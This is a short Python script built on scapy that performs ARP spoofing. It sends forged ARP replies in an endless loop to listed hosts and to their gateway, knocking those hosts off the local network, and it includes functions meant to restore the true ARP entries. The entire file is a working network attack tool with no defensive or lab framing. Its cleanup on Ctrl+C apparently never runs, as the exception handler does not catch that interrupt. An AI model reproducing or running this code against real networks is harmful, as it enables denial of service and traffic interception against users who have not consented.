from types import resolve_bases
from scapy.all import *
import time
import logging
import sys

logger = logging.getLogger("SPOFFER")


def poison_host(target_ip, gateway_to_change, target_mac):
    try:
        packet = ARP(op = 2, pdst = target_ip, 
                        hwdst = target_mac, 
                        psrc = gateway_to_change)

        send(packet, verbose = False)
        return True

    except Exception:
        return False

    

def restore(target_ip, gateway_to_change, target_mac, gateway_mac):
        try:
            packet = ARP(op = 2, pdst = target_ip, 
                            hwdst = target_mac, 
                            psrc = gateway_to_change,
                            hwsrc = gateway_mac)
            send(packet, verbose = False)
            return True

        except Exception:
            return False

def kick_hosts(hosts, gateway, targets_MAC, gateway_MAC):
    try:
        if not gateway_MAC:
            logger.critical("Can't find gateway's mac address")
            exit()

        logger.info("Starting to kick...\n Press cntrl+c to stop")
        while True:
            for i, host in enumerate(hosts):
                poison_host(host, gateway, targets_MAC[i])
                poison_host(gateway, host, gateway_MAC)
            time.sleep(1)

    except Exception:
        restore_hosts(hosts, gateway, targets_MAC, gateway_MAC)

def restore_hosts(hosts, gateway, targets_MAC, gateway_MAC):
    for i, host in enumerate(hosts):
        restore(host, gateway, targets_MAC[i] ,gateway_MAC)
        restore(gateway, host, gateway_MAC, targets_MAC[i])
    logger.info("Stopped...")


